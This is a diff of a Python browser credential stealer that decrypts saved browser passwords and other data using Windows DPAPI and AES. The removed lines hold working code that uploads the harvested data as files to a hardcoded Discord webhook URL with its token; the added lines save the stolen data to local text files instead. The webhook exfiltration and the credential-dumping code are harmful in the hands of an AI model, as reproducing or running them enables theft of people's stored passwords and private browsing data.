@@ -4,7 +4,6 @@ import os
 import shutil
 import sqlite3
 from datetime import datetime, timedelta
-import requests
 
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
@@ -101,32 +100,13 @@ def decrypt_password(buff: bytes, key: bytes) -> str:
 
 
 def save_results(browser_name, type_of_data, content):
-    webhook_url = "https://discord.com/api/webhooks/1441151652563390656/woW6mcT1jv5dzcdIpQLiCsz5fEx8LV1VC9PYgMMINE0qUcAHNjczAEE4SMdPr3SO9d8L"
-
-    if content is None or content == "":
-        print("\t [-] No Data Found!")
-        return
-
-    # Prepare a file-like object from the content string
-    from io import BytesIO
-    file_content = BytesIO(content.encode("utf-8"))
-    
-    # Filename based on browser_name and type_of_data
-    filename = f"{browser_name}_{type_of_data}.txt"
-    
-    files = {
-        "file": (filename, file_content, "text/plain")
-    }
-    data = {
-        "content": f"Here is the {type_of_data} data from {browser_name}"
-    }
-
-    response = requests.post(webhook_url, data=data, files=files)
-
-    if response.status_code == 204 or response.status_code == 200:
-        print(f"\t [*] Sent content to webhook as {filename}")
+    if not os.path.exists(browser_name):
+        os.mkdir(browser_name)
+    if content != "" and content != None:
+        open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
+        print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
     else:
-        print(f"\t [-] Failed to send content: HTTP {response.status_code}")
+        print(f"\t [-] No Data Found!")
 
 
 def get_data(path: str, profile: str, key, type_of_data):
